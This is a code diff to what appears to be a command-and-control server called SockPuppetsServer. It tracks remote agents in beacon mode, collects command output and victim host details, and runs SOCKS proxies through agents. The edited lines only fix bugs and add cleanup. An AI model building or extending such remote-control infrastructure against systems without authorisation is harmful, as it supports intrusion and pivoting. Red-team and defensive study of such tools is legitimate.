@@ -66,7 +66,10 @@ class EventBus:
 
     def subscribe(self) -> asyncio.Queue:
         q = asyncio.Queue()
-        loop = asyncio.get_event_loop()
+        try:
+            loop = asyncio.get_running_loop()
+        except RuntimeError:
+            loop = asyncio.get_event_loop()
         with self._lock:
             self._subscribers.append((q, loop))
         return q
@@ -547,15 +550,15 @@ class SockPuppetsServer:
                             command = data.get('command', '')
                             timestamp = data.get('timestamp', '')
 
-                            # Store result differently based on mode
                             if agent.mode == 'beacon':
-                                # Beacon mode: store for later retrieval
                                 agent.pending_results.append({
                                     'command': command,
                                     'output': output,
                                     'timestamp': timestamp,
                                     'received_at': datetime.now().isoformat()
                                 })
+                                if len(agent.pending_results) > 500:
+                                    agent.pending_results = agent.pending_results[-200:]
                             else:
                                 # Streaming mode: resolve command future by command_id
                                 command_id = data.get('command_id', '')
@@ -833,6 +836,10 @@ class SockPuppetsServer:
                 if not agent._interval_set_by_operator:
                     agent.beacon_interval = metadata.get('beacon_interval', agent.beacon_interval)
                     agent.beacon_jitter = metadata.get('beacon_jitter', agent.beacon_jitter)
+                for field in ('hostname', 'username', 'os'):
+                    val = metadata.get(field)
+                    if val and agent.metadata.get(field) in (None, 'Unknown', '?', 'rejoined'):
+                        agent.metadata[field] = val
 
             results = data.get('results') or []
             if results:
@@ -938,7 +945,7 @@ class SockPuppetsServer:
 
             return web.Response(text=encrypted_response, content_type='text/html')
         else:
-            metadata = data.get('metadata') or {'mode': 'beacon', 'hostname': 'rejoined'}
+            metadata = data.get('metadata') or {'mode': 'beacon'}
             metadata['ip'] = request.remote or 'Unknown'
             transport_type = 'https' if request.secure else 'http'
             agent = self.register_agent_common(agent_id, metadata, transport_type)
@@ -1636,6 +1643,18 @@ class SockPuppetsServer:
             agent.socks_proxy = None
             return f"Failed to start SOCKS proxy: {str(e)}"
 
+    async def stop_socks_proxy(self, agent_id: str) -> str:
+        """Stop SOCKS5 proxy for an agent."""
+        if agent_id not in self.agents:
+            return "Agent not found"
+        agent = self.agents[agent_id]
+        if agent.socks_proxy is None:
+            return "No SOCKS proxy running for this agent"
+        port = agent.socks_proxy
+        self._cleanup_agent_socks(agent)
+        logger.info(f"SOCKS proxy stopped for {agent_id} (was on port {port})")
+        return f"SOCKS proxy stopped (was on port {port})"
+
     async def _run_socks_server(self, agent_id: str, port: int):
         """Run SOCKS5 server"""
         server = await asyncio.start_server(
@@ -2060,8 +2079,12 @@ class SockPuppetsServer:
                     if info['type'] == 'websocket':
                         info['server'].close()
                         await info['server'].wait_closed()
-                    else:
+                    elif 'runner' in info:
                         await info['runner'].cleanup()
+                    elif 'server' in info:
+                        info['server'].close()
+                        if hasattr(info['server'], 'wait_closed'):
+                            await info['server'].wait_closed()
                     logger.info(f"Stopped {info['type'].upper()} listener on port {info['port']}")
                 except Exception as e:
                     logger.error(f"Error stopping listener {name}: {e}")
